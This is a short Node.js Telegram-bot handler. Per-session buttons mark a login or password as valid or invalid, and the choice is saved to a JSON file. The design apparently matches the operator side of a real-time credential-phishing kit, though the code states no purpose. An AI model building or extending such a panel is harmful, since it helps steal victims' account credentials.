const fs = require('fs');
const path = require('path');
const bot = require('./botjs').bot;
// const { setAuto,getAuto } = require('./index');

const sessionDir = path.join(__dirname, 'session');
if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir);
}

bot.on('callback_query', (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;
    console.log('123');
    const sessionId = message.text.split('\n').find(line => line.startsWith('Session ID: ')).split(': ')[1];

    console.log(sessionId);
    if (data === 'valid_login') {
        bot.sendMessage(message.chat.id, 'Вы выбрали: Верный логин').then((sentMessage) => {
            setTimeout(() => {
                bot.deleteMessage(message.chat.id, sentMessage.message_id);
            }, 2000); // Удалить сообщение через 2 секунды
        });
    } else if (data === 'invalid_login') {
        bot.sendMessage(message.chat.id, 'Вы выбрали: Неверный логин').then((sentMessage) => {
            setTimeout(() => {
                bot.deleteMessage(message.chat.id, sentMessage.message_id);
            }, 2000); // Удалить сообщение через 2 секунды
        });
    } else if (data === 'valid_password') {
        bot.sendMessage(message.chat.id, 'Вы выбрали: Верный пароль').then((sentMessage) => {
            setTimeout(() => {
                bot.deleteMessage(message.chat.id, sentMessage.message_id);
            }, 2000); // Удалить сообщение через 2 секунды
        });
    } else if (data === 'invalid_password') {
        bot.sendMessage(message.chat.id, 'Вы выбрали: Неверный пароль').then((sentMessage) => {
            setTimeout(() => {
                bot.deleteMessage(message.chat.id, sentMessage.message_id);
            }, 2000); // Удалить сообщение через 2 секунды
        });
    }

    const filePath = path.join(sessionDir, `${sessionId}.json`);
    const sessionData = {
        sessionId: sessionId,
        callback_data: data
    };

    fs.writeFile(filePath, JSON.stringify(sessionData, null, 2), (err) => {
        if (err) {
            console.error('Error writing file:', err);
        } else {
            console.log('Data written to file:', filePath);
        }
    });
});
